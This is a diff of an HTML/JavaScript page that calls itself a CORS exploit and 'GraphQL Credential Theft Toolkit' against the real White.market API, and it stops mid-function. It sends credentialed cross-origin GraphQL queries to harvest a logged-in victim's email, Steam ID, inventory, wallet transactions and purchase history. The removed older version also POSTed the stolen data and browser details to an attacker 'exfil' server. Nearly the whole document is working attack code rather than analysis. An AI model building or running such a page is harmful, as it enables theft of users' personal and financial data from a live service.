@@ -2,344 +2,950 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>White.market CORS Exploit v2 - Validated Queries</title>
+    <title>White.market CORS Exploit v3</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap');
+
+        :root {
+            --bg:       #060910;
+            --bg2:      #0d1117;
+            --bg3:      #131922;
+            --border:   #1e2d3d;
+            --accent:   #00e5ff;
+            --accent2:  #ff3e3e;
+            --accent3:  #ffd600;
+            --green:    #00ff9d;
+            --dim:      #4a6070;
+            --text:     #c9d1d9;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
             padding: 20px;
-            max-width: 1400px;
-            margin: 0 auto;
         }
-        h1 { color: #ff0000; text-align: center; }
-        .section { 
-            background: #1a1a1a; 
-            border: 1px solid #333; 
-            padding: 15px; 
-            margin: 15px 0;
-            border-radius: 5px;
+
+        /* Scanline overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0,0,0,0.07) 2px,
+                rgba(0,0,0,0.07) 4px
+            );
+            pointer-events: none;
+            z-index: 1000;
         }
-        .success { color: #00ff00; }
-        .fail { color: #ff0000; }
-        pre {
-            background: #000;
-            padding: 10px;
-            overflow-x: auto;
-            border-left: 3px solid #00ff00;
-            max-height: 300px;
-            overflow-y: scroll;
+
+        .container { max-width: 1400px; margin: 0 auto; }
+
+        /* Header */
+        header {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
         }
-        button {
-            background: #ff0000;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
+
+        .title-block h1 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .title-block .sub {
+            color: var(--dim);
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+
+        /* Auth Status Banner */
+        #auth-banner {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 16px;
+            font-size: 0.8rem;
+        }
+
+        #auth-indicator {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: var(--dim);
+            flex-shrink: 0;
+            transition: background 0.3s, box-shadow 0.3s;
+        }
+        #auth-indicator.checking { background: var(--accent3); box-shadow: 0 0 8px var(--accent3); animation: pulse 1s infinite; }
+        #auth-indicator.authed   { background: var(--green);   box-shadow: 0 0 8px var(--green); }
+        #auth-indicator.unauthed { background: var(--accent2); box-shadow: 0 0 8px var(--accent2); }
+
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+        #auth-text { color: var(--text); }
+
+        /* Stats Bar */
+        .stats-bar {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 18px;
+            min-width: 120px;
+        }
+
+        .stat-card .label {
+            font-size: 0.65rem;
+            color: var(--dim);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .stat-card .value {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-top: 2px;
+        }
+
+        .stat-card.success .value { color: var(--green); }
+        .stat-card.fail    .value { color: var(--accent2); }
+        .stat-card.data    .value { color: var(--accent); }
+        .stat-card.total   .value { color: var(--accent3); }
+
+        /* Layout */
+        .layout {
+            display: grid;
+            grid-template-columns: 420px 1fr;
+            gap: 20px;
+            align-items: start;
+        }
+
+        @media (max-width: 900px) {
+            .layout { grid-template-columns: 1fr; }
+        }
+
+        /* Panel */
+        .panel {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .panel-header {
+            background: var(--bg3);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 16px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .panel-body { padding: 16px; }
+
+        /* Preset Queries */
+        .query-list {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .query-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 8px 12px;
             cursor: pointer;
-            margin: 5px;
+            transition: border-color 0.15s, background 0.15s;
+            font-size: 0.8rem;
         }
-        .stat {
-            display: inline-block;
-            margin: 10px 20px;
-            font-weight: bold;
+
+        .query-item:hover { border-color: var(--accent); background: rgba(0,229,255,0.04); }
+        .query-item.selected { border-color: var(--accent); background: rgba(0,229,255,0.08); }
+
+        .query-item input[type=checkbox] { accent-color: var(--accent); width: 14px; height: 14px; }
+
+        .query-item .qname { flex: 1; color: var(--text); }
+        .query-item .qbadge {
+            font-size: 0.6rem;
+            padding: 2px 6px;
+            border-radius: 3px;
+            background: rgba(0,229,255,0.1);
+            color: var(--accent);
+            letter-spacing: 1px;
         }
+
+        .query-item .qstatus { font-size: 0.75rem; width: 16px; text-align: center; }
+
+        /* Custom Query Editor */
+        .custom-editor {
+            margin-top: 16px;
+            border-top: 1px solid var(--border);
+            padding-top: 16px;
+        }
+
+        .custom-editor label {
+            display: block;
+            font-size: 0.65rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--dim);
+            margin-bottom: 6px;
+        }
+
+        .custom-editor input[type=text] {
+            width: 100%;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 8px 12px;
+            color: var(--text);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            margin-bottom: 10px;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+        .custom-editor input[type=text]:focus { border-color: var(--accent); }
+
+        .custom-editor textarea {
+            width: 100%;
+            height: 180px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 12px;
+            color: var(--green);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.75rem;
+            resize: vertical;
+            outline: none;
+            line-height: 1.5;
+            transition: border-color 0.15s;
+            margin-bottom: 10px;
+        }
+        .custom-editor textarea:focus { border-color: var(--accent); }
+
+        .vars-editor {
+            width: 100%;
+            height: 70px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 8px 12px;
+            color: var(--accent3);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.75rem;
+            resize: vertical;
+            outline: none;
+            transition: border-color 0.15s;
+            margin-bottom: 10px;
+        }
+        .vars-editor:focus { border-color: var(--accent); }
+
+        /* Buttons */
+        .btn-row {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+
+        button {
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 18px;
+            cursor: pointer;
+            transition: opacity 0.15s, transform 0.1s;
+        }
+        button:hover { opacity: 0.85; }
+        button:active { transform: scale(0.97); }
+        button:disabled { opacity: 0.35; cursor: not-allowed; }
+
+        .btn-primary   { background: var(--accent);  color: var(--bg); }
+        .btn-danger    { background: var(--accent2);  color: #fff; }
+        .btn-warn      { background: var(--accent3);  color: var(--bg); }
+        .btn-ghost     { background: transparent; border: 1px solid var(--border); color: var(--dim); }
+
+        /* Results Panel */
+        .results-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .result-card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+            animation: slideIn 0.25s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .result-card.success { border-left: 3px solid var(--green); }
+        .result-card.fail    { border-left: 3px solid var(--accent2); }
+        .result-card.info    { border-left: 3px solid var(--accent); }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            background: var(--bg3);
+            border-bottom: 1px solid var(--border);
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .result-header .rname {
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .result-header .rmeta {
+            font-size: 0.65rem;
+            color: var(--dim);
+            letter-spacing: 1px;
+        }
+
+        .result-body {
+            padding: 0;
+            overflow: hidden;
+            max-height: 0;
+            transition: max-height 0.3s ease;
+        }
+        .result-body.open { max-height: 600px; }
+
+        .result-body pre {
+            padding: 14px;
+            font-size: 0.72rem;
+            line-height: 1.6;
+            overflow-x: auto;
+            overflow-y: auto;
+            max-height: 500px;
+            color: var(--green);
+            background: var(--bg);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* Auth check result */
+        .auth-detail {
+            font-size: 0.72rem;
+            line-height: 1.6;
+            padding: 10px 14px;
+        }
+
+        .auth-detail .row {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+            padding: 4px 0;
+        }
+
+        .auth-detail .row:last-child { border-bottom: none; }
+        .auth-detail .key { color: var(--dim); }
+        .auth-detail .val-ok  { color: var(--green); }
+        .auth-detail .val-bad { color: var(--accent2); }
+        .auth-detail .val-warn { color: var(--accent3); }
+
+        /* Empty state */
+        .empty {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--dim);
+            font-size: 0.8rem;
+            border: 1px dashed var(--border);
+            border-radius: 6px;
+        }
+
+        .empty .icon { font-size: 2.5rem; margin-bottom: 12px; opacity: 0.4; }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--dim); }
     </style>
 </head>
 <body>
-    <h1>🎯 White.market CORS Exploit v2</h1>
-    <h3 style="text-align: center; color: #ffaa00;">Using Validated Query Patterns</h3>
-    
-    <div class="section">
-        <h2>📊 Statistics</h2>
-        <div class="stat success">Successful: <span id="success">0</span></div>
-        <div class="stat fail">Failed: <span id="fail">0</span></div>
-        <div class="stat" style="color: #ffaa00;">Data: <span id="data">0</span> KB</div>
+<div class="container">
+
+    <header>
+        <div class="title-block">
+            <h1>⚡ White.market · CORS Exploit v3</h1>
+            <div class="sub">GraphQL Credential Theft Toolkit · Inline Response Viewer</div>
+        </div>
+        <div id="auth-banner">
+            <div id="auth-indicator"></div>
+            <span id="auth-text">Auth status: not checked</span>
+        </div>
+    </header>
+
+    <!-- Stats -->
+    <div class="stats-bar">
+        <div class="stat-card success"><div class="label">Successful</div><div class="value" id="stat-ok">0</div></div>
+        <div class="stat-card fail">   <div class="label">Failed</div>    <div class="value" id="stat-fail">0</div></div>
+        <div class="stat-card data">   <div class="label">Data (KB)</div> <div class="value" id="stat-kb">0.00</div></div>
+        <div class="stat-card total">  <div class="label">Total Queries</div><div class="value" id="stat-total">0</div></div>
     </div>
 
-    <div class="section">
-        <button onclick="runAllQueries()">🚀 RUN ALL QUERIES</button>
-        <button onclick="clearResults()">Clear</button>
+    <div class="layout">
+
+        <!-- LEFT: Query Selector + Custom Query -->
+        <div>
+            <!-- Preset Queries -->
+            <div class="panel">
+                <div class="panel-header">
+                    <span>Preset Queries</span>
+                    <div style="display:flex;gap:6px;">
+                        <button class="btn-ghost" style="padding:4px 10px;font-size:0.7rem;" onclick="toggleAll(true)">ALL</button>
+                        <button class="btn-ghost" style="padding:4px 10px;font-size:0.7rem;" onclick="toggleAll(false)">NONE</button>
+                    </div>
+                </div>
+                <div class="panel-body">
+                    <div class="query-list" id="preset-list"></div>
+                    <div class="btn-row">
+                        <button class="btn-warn" onclick="checkAuth()">🔐 Check Auth</button>
+                        <button class="btn-primary" onclick="runSelected()">▶ Run Selected</button>
+                        <button class="btn-ghost" onclick="clearResults()">✕ Clear</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Custom Query Editor -->
+            <div class="panel" style="margin-top:16px;">
+                <div class="panel-header">Custom Query</div>
+                <div class="panel-body">
+                    <div class="custom-editor">
+                        <label>Query Name (display label)</label>
+                        <input type="text" id="custom-name" placeholder="e.g. User KYC Data" />
+
+                        <label>GraphQL Query</label>
+                        <textarea id="custom-query" placeholder="query SomeQuery {&#10;  some_field {&#10;    id&#10;    value&#10;  }&#10;}"></textarea>
+
+                        <label>Variables (JSON, optional)</label>
+                        <textarea class="vars-editor" id="custom-vars" placeholder='{"pagination": {"first": 50}}'></textarea>
+
+                        <div class="btn-row">
+                            <button class="btn-primary" onclick="runCustomQuery()">▶ Run Query</button>
+                            <button class="btn-ghost" onclick="addCustomToPresets()">＋ Save as Preset</button>
+                            <button class="btn-ghost" onclick="clearCustomEditor()">✕ Clear</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RIGHT: Results -->
+        <div>
+            <div class="panel-header" style="margin-bottom:12px;border-radius:6px;border:1px solid var(--border);">
+                Results
+                <span id="result-count" style="color:var(--dim);font-size:0.7rem;font-family:'Share Tech Mono';font-weight:400;letter-spacing:1px;">0 entries</span>
+            </div>
+            <div class="results-panel" id="results">
+                <div class="empty" id="empty-state">
+                    <div class="icon">⬡</div>
+                    <div>No queries executed yet.</div>
+                    <div style="margin-top:6px;font-size:0.65rem;">Run auth check or select queries to begin.</div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div class="section">
-        <h2>📡 Results</h2>
-        <div id="results"></div>
-    </div>
+</div>
 
-    <script>
-    const CONFIG = {
-        endpoint: 'https://api.white.market/graphql/api',
-        exfilServer: 'http://0.0.0.0:5000/exfil', // Update with your server
-        delay: 500
-    };
+<script>
+const CONFIG = {
+    endpoint: 'https://api.white.market/graphql/api',
+    delay: 500
+};
 
-    let stats = { success: 0, fail: 0, dataKB: 0 };
+const stats = { ok: 0, fail: 0, kb: 0, total: 0 };
+let resultCount = 0;
 
-    // Based on your working example - these patterns are CONFIRMED to work
-    const QUERIES = {
-        market_list: {
-            name: "Market Product List",
-            query: `
-                query MarketList($search: MarketProductSearchInput, $pagination: ForwardPaginationInput) {
-                    market_list(search: $search, forwardPagination: $pagination) {
-                        totalCount
-                        pageInfo {
-                            hasNextPage
-                            endCursor
-                        }
-                        edges {
-                            node {
-                                id
-                                price {
-                                    value
-                                    currency
-                                }
-                                slug
-                                deliveryPromise
-                                offerType
-                                isSuperDeal
-                                item {
-                                    appId
-                                    id
-                                    description {
-                                        name
-                                        icon
-                                        isTradeable
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            `,
-            variables: {
-                pagination: { first: 50 }
-            }
-        },
+// ─── Preset Query Definitions ────────────────────────────────────────────────
 
-        // Try similar patterns for other endpoints
-        market_deal_list: {
-            name: "User Purchase History",
-            query: `
-                query MarketDeals($search: MarketDealSearchInput, $pagination: ForwardPaginationInput) {
-                    market_deal_list(search: $search, forwardPagination: $pagination) {
-                        totalCount
-                        edges {
-                            node {
-                                id
-                                status
-                                price {
-                                    value
-                                    currency
-                                }
-                                createdAt
-                            }
-                        }
-                    }
-                }
-            `,
-            variables: {
-                pagination: { first: 50 }
-            }
-        },
-
-        person_inventory: {
-            name: "User Inventory",
-            query: `
-                query PersonInventory($search: PersonInventorySearchInput, $pagination: ForwardPaginationInput) {
-                    person_inventory(search: $search, forwardPagination: $pagination) {
-                        totalCount
-                        totalCost {
-                            value
-                            currency
-                        }
-                        edges {
-                            node {
-                                id
-                                item {
-                                    appId
-                                    description {
-                                        name
-                                        icon
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            `,
-            variables: {
-                pagination: { first: 100 }
-            }
-        },
-
-        wallet_transaction_list: {
-            name: "Transaction History",
-            query: `
-                query WalletTransactions($search: WalletTransactionSearchInput, $pagination: ForwardPaginationInput) {
-                    wallet_transaction_list(search: $search, forwardPagination: $pagination) {
-                        totalCount
-                        edges {
-                            node {
-                                id
-                                amount {
-                                    value
-                                    currency
-                                }
-                                status
-                                reason
-                                createdAt
-                            }
-                        }
-                    }
-                }
-            `,
-            variables: {
-                pagination: { first: 50 }
-            }
-        },
-
-        person_full: {
-            name: "User Profile",
-            query: `
-                query PersonFull {
-                    person_full {
-                        id
-                        username
-                        email
-                        steamId
-                    }
-                }
-            `
-        },
-
-        person_stats: {
-            name: "User Statistics",
-            query: `
-                query PersonStats {
-                    person_stats {
-                        totals {
-                            sold
-                            bought
-                        }
-                    }
-                }
-            `
+const PRESETS = {
+    person_full: {
+        name: "User Profile (PII)",
+        badge: "PII",
+        query: `query PersonFull {
+    person_full {
+        id
+        username
+        email
+        steamId
+    }
+}`,
+        variables: {}
+    },
+    person_inventory: {
+        name: "User Inventory",
+        badge: "ASSETS",
+        query: `query PersonInventory($search: PersonInventorySearchInput, $pagination: ForwardPaginationInput) {
+    person_inventory(search: $search, forwardPagination: $pagination) {
+        totalCount
+        totalCost {
+            value
+            currency
         }
-    };
-
-    async function executeQuery(key, queryObj) {
-        try {
-            const payload = {
-                query: queryObj.query,
-                variables: queryObj.variables || {},
-                operationName: queryObj.name.replace(/\s+/g, '')
-            };
-
-            const response = await fetch(CONFIG.endpoint, {
-                method: 'POST',
-                credentials: 'include', // Send cookies!
-                headers: {
-                    'Content-Type': 'application/json',
-                    'x-accept-language': 'en_US'
-                },
-                body: JSON.stringify(payload)
-            });
-
-            const data = await response.json();
-            
-            const success = response.ok && data.data && !data.errors;
-            
-            if (success) {
-                stats.success++;
-                const dataStr = JSON.stringify(data);
-                stats.dataKB += (dataStr.length / 1024);
-                
-                // Exfiltrate
-                try {
-                    await fetch(CONFIG.exfilServer, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            timestamp: new Date().toISOString(),
-                            queryKey: key,
-                            queryName: queryObj.name,
-                            data: data,
-                            victim: {
-                                userAgent: navigator.userAgent,
-                                referrer: document.referrer
-                            }
-                        })
-                    });
-                } catch (e) {
-                    console.warn('Exfil failed:', e.message);
+        edges {
+            node {
+                id
+                item {
+                    appId
+                    description {
+                        name
+                        icon
+                    }
                 }
-            } else {
-                stats.fail++;
             }
-            
-            updateStats();
-            logResult(queryObj.name, success, data);
-            
-            return { success, data };
-            
-        } catch (error) {
-            stats.fail++;
-            updateStats();
-            logResult(queryObj.name, false, error.message);
-            return { success: false, error: error.message };
         }
     }
+}`,
+        variables: { pagination: { first: 100 } }
+    },
+    wallet_transaction_list: {
+        name: "Transaction History",
+        badge: "FINANCE",
+        query: `query WalletTransactions($search: WalletTransactionSearchInput, $pagination: ForwardPaginationInput) {
+    wallet_transaction_list(search: $search, forwardPagination: $pagination) {
+        totalCount
+        edges {
+            node {
+                id
+                amount { value currency }
+                status
+                reason
+                createdAt
+            }
+        }
+    }
+}`,
+        variables: { pagination: { first: 50 } }
+    },
+    market_deal_list: {
+        name: "Purchase / Sale History",
+        badge: "HISTORY",
+        query: `query MarketDeals($search: MarketDealSearchInput, $pagination: ForwardPaginationInput) {
+    market_deal_list(search: $search, forwardPagination: $pagination) {
+        totalCount
+        edges {
+            node {
+                id
+                status
+                price { value currency }
+                createdAt
+            }
+        }
+    }
+}`,
+        variables: { pagination: { first: 50 } }
+    },
+    person_stats: {
+        name: "User Statistics",
+        badge: "STATS",
+        query: `query PersonStats {
+    person_stats {
+        totals { sold bought }
+    }
+}`,
+        variables: {}
+    },
+    market_list: {
+        name: "Market Product List",
+        badge: "PUBLIC",
+        query: `query MarketList($search: MarketProductSearchInput, $pagination: ForwardPaginationInput) {
+    market_list(search: $search, forwardPagination: $pagination) {
+        totalCount
+        pageInfo { hasNextPage endCursor }
+        edges {
+            node {
+                id
+                price { value currency }
+                slug
+                deliveryPromise
+                offerType
+                isSuperDeal
+                item {
+                    appId id
+                    description { name icon isTradeable }
+                }
+            }
+        }
+    }
+}`,
+        variables: { pagination: { first: 50 } }
+    }
+};
 
-    function logResult(name, success, data) {
-        const div = document.createElement('div');
-        div.className = 'section';
-        
-        const status = success ? '✅' : '❌';
-        const statusClass = success ? 'success' : 'fail';
-        
-        div.innerHTML = `
-            <h3 class="${statusClass}">${status} ${name}</h3>
-            <pre>${JSON.stringify(data, null, 2)}</pre>
+// Track per-query run status for preset list indicators
+const queryStatus = {};
+
+// ─── Build Preset List ────────────────────────────────────────────────────────
+
+function buildPresetList() {
+    const list = document.getElementById('preset-list');
+    list.innerHTML = '';
+    for (const [key, q] of Object.entries(PRESETS)) {
+        const item = document.createElement('div');
+        item.className = 'query-item';
+        item.id = `qi-${key}`;
+        item.innerHTML = `
+            <input type="checkbox" id="chk-${key}" checked>
+            <label for="chk-${key}" class="qname" style="cursor:pointer;">${q.name}</label>
+            <span class="qbadge">${q.badge}</span>
+            <span class="qstatus" id="qs-${key}">·</span>
         `;
-        
-        const results = document.getElementById('results');
-        results.insertBefore(div, results.firstChild);
+        // Click anywhere on row (except checkbox) loads into editor
+        item.addEventListener('click', e => {
+            if (e.target.tagName !== 'INPUT') loadPresetIntoEditor(key);
+        });
+        list.appendChild(item);
     }
+}
 
-    function updateStats() {
-        document.getElementById('success').textContent = stats.success;
-        document.getElementById('fail').textContent = stats.fail;
-        document.getElementById('data').textContent = stats.dataKB.toFixed(2);
+function loadPresetIntoEditor(key) {
+    const q = PRESETS[key];
+    document.getElementById('custom-name').value  = q.name;
+    document.getElementById('custom-query').value = q.query.trim();
+    document.getElementById('custom-vars').value  = JSON.stringify(q.variables || {}, null, 2);
+}
+
+function toggleAll(state) {
+    for (const key of Object.keys(PRESETS)) {
+        document.getElementById(`chk-${key}`).checked = state;
     }
+}
 
-    async function runAllQueries() {
-        clearResults();
-        
-        console.log('[*] Starting exploitation...');
-        
-        for (const [key, queryObj] of Object.entries(QUERIES)) {
-            console.log(`[*] Executing: ${queryObj.name}`);
-            await executeQuery(key, queryObj);
-            await new Promise(r => setTimeout(r, CONFIG.delay));
+// ─── Auth Check (Preflight) ────────────────────────────────────────────────────
+/*
+  Proper preflight auth check:
+  1. First send a lightweight OPTIONS-equivalent by doing a real minimal POST
+     with credentials to see if CORS is open and session is active.
+  2. We use person_full as a sentinel — it requires authentication and is cheap.
+  3. We separately surface:
+       - CORS: can JS read the response at all?
+       - Auth: does the session cookie work (200 + real data vs 401/empty)?
+       - Cookies: are cookies actually being sent (credentials:include working)?
+*/
+async function checkAuth() {
+    const indicator = document.getElementById('auth-indicator');
+    const authText  = document.getElementById('auth-text');
+
+    indicator.className = 'checking';
+    authText.textContent = 'Probing CORS + session...';
+
+    const sentinelQuery = `query AuthCheck { person_full { id username email } }`;
+
+    let corsOk = false, authed = false, cookieSent = false, httpStatus = null,
+        corsHeader = '—', userId = null, username = null, errorDetail = '—';
+
+    try {
+        const res = await fetch(CONFIG.endpoint, {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'x-accept-language': 'en_US'
+            },
+            body: JSON.stringify({ query: sentinelQuery, operationName: 'AuthCheck' })
+        });
+
+        httpStatus = res.status;
+
+        // If fetch() resolved at all, CORS is open (browser would throw on CORS block)
+        corsOk = true;
+        corsHeader = res.headers.get('access-control-allow-origin') || '(not exposed)';
+
+        // credentials:include was sent — whether cookies were accepted depends on server
+        cookieSent = true;
+
+        const body = await res.json();
+
+        if (res.ok && body?.data?.person_full?.id) {
+            authed    = true;
+            userId    = body.data.person_full.id;
+            username  = body.data.person_full.username;
+        } else if (body?.errors) {
+            errorDetail = body.errors.map(e => e.message).join('; ');
         }
-        
-        console.log('[+] Exploitation complete!');
-        alert(`Complete!\nSuccessful: ${stats.success}\nFailed: ${stats.fail}\nData: ${stats.dataKB.toFixed(2)} KB`);
+
+    } catch (err) {
+        // fetch threw = CORS blocked or network error
+        corsOk      = false;
+        errorDetail = err.message;
     }
 
-    function clearResults() {
-        document.getElementById('results').innerHTML = '';
-        stats = { success: 0, fail: 0, dataKB: 0 };
+    // Update indicator
+    if (authed) {
+        indicator.className = 'authed';
+        authText.textContent = `Authenticated · ${username ?? userId}`;
+    } else if (corsOk) {
+        indicator.className = 'unauthed';
+        authText.textContent = `CORS open · session not active`;
+    } else {
+        indicator.className = 'unauthed';
+        authText.textContent = `CORS blocked`;
+    }
+
+    // Build inline result card
+    const rows = [
+        { key: 'CORS Open (JS can read response)', val: corsOk ? '✓ YES' : '✗ NO', cls: corsOk ? 'val-ok' : 'val-bad' },
+        { key: 'ACAO Header',                       val: corsHeader,               cls: corsOk ? 'val-ok' : 'val-warn' },
+        { key: 'Credentials Sent (include)',         val: cookieSent ? '✓ YES' : '✗ NO', cls: cookieSent ? 'val-ok' : 'val-bad' },
+        { key: 'HTTP Status',                        val: httpStatus ?? 'N/A',      cls: httpStatus === 200 ? 'val-ok' : 'val-warn' },
+        { key: 'Session Active (authenticated)',     val: authed ? `✓ YES · user: ${username ?? userId}` : '✗ NO', cls: authed ? 'val-ok' : 'val-bad' },
+        { key: 'Error Detail',                       val: errorDetail,              cls: 'val-warn' }
+    ];
+
+    const rowsHtml = rows.map(r =>
+        `<div class="row"><span class="key">${r.key}</span><span class="${r.cls}">${r.val}</span></div>`
+    ).join('');
+
+    addResultCard({
+        name:    '🔐 Preflight Auth Check',
+        status:  authed ? 'success' : corsOk ? 'fail' : 'fail',
+        bodyHtml: `<div class="auth-detail">${rowsHtml}</div>`,
+        meta:    new Date().toLocaleTimeString()
+    });
+}
+
+// ─── Query Execution ───────────────────────────────────────────────────────────
+
+async function executeQuery(name, query, variables = {}) {
+    const payload = {
+        query,
+        variables,
+        operationName: name.replace(/\s+/g, '')
+    };
+
+    try {
+        const res = await fetch(CONFIG.endpoint, {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'x-accept-language': 'en_US'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        const data = await res.json();
+        const success = res.ok && data?.data && !data?.errors;
+
+        const kb = JSON.stringify(data).length / 1024;
+        if (success) { stats.ok++; stats.kb += kb; }
+        else          { stats.fail++; }
+        stats.total++;
         updateStats();
+
+        addResultCard({
+            name,
+            status:  success ? 'success' : 'fail',
+            bodyHtml: `<pre>${escHtml(JSON.stringify(data, null, 2))}</pre>`,
+            meta:    `HTTP ${res.status} · ${kb.toFixed(2)} KB · ${new Date().toLocaleTimeString()}`
+        });
+
+        return { success, data };
+
+    } catch (err) {
+        stats.fail++;
+        stats.total++;
+        updateStats();
+
+        addResultCard({
+            name,
+            status:  'fail',
+            bodyHtml: `<pre style="color:var(--accent2);">CORS BLOCKED or Network Error:\n${escHtml(err.message)}</pre>`,
+            meta:    new Date().toLocaleTimeString()
+        });
+
+        return { success: false, error: err.message };
+    }
+}
+
+async function runSelected() {
+    for (const [key, q] of Object.entries(PRESETS)) {
+        const chk = document.getElementById(`chk-${key}`);
+        if (!chk?.checked) continue;
+
+        const statusEl = document.getElementById(`qs-${key}`);
+        if (statusEl) statusEl.textContent = '⏳';
+
+        const result = await executeQuery(q.name, q.query, q.variables || {});
+
+        if (statusEl) statusEl.textContent = result.success ? '✅' : '❌';
+        await sleep(CONFIG.delay);
+    }
+}
+
+async function runCustomQuery() {
+    const name  = document.getElementById('custom-name').value.trim()  || 'Custom Query';
+    const query = document.getElementById('custom-query').value.trim();
+    const varsRaw = document.getElementById('custom-vars').value.trim();
+
+    if (!query) {
+        alert('Enter a GraphQL query first.');
+        return;
     }
 
-    // Auto-run after 2 seconds
-    setTimeout(() => {
-        console.log('[*] Auto-starting in 2 seconds...');
-        // Uncomment to auto-run:
-        // setTimeout(runAllQueries, 2000);
-    }, 1000);
-    </script>
+    let variables = {};
+    if (varsRaw) {
+        try { variables = JSON.parse(varsRaw); }
+        catch { alert('Variables JSON is invalid.'); return; }
+    }
+
+    await executeQuery(name, query, variables);
+}
+
+function addCustomToPresets() {
+    const name  = document.getElementById('custom-name').value.trim();
+    const query = document.getElementById('custom-query').value.trim();
+    const varsRaw = document.getElementById('custom-vars').value.trim();
+
+    if (!query) { alert('Enter a query first.'); return; }
+
+    let variables = {};
+    if (varsRaw) {
+        try { variables = JSON.parse(varsRaw); }
+        catch { alert('Variables JSON is invalid.'); return; }
+    }
+
+    const key = 'custom_' + Date.now();
+    PRESETS[key] = { name: name || 'Custom Query', badge: 'CUSTOM', query, variables };
+    buildPresetList();
+}
+
+function clearCustomEditor() {
+    document.getElementById('custom-name').value  = '';
+    document.getElementById('custom-query').value = '';
+    document.getElementById('custom-vars').value  = '';
+}
+
+// ─── Result Cards ─────────────────────────────────────────────────────────────
+
+function addResultCard({ name, status, bodyHtml, meta }) {
+    const empty = document.getElementById('empty-state');
+    if (empty) empty.remove();
+
+    resultCount++;
+    document.getElementById('result-count').textContent = `${resultCount} entr${resultCount === 1 ? 'y' : 'ies'}`;
+
+    const card = document.createElement('div');
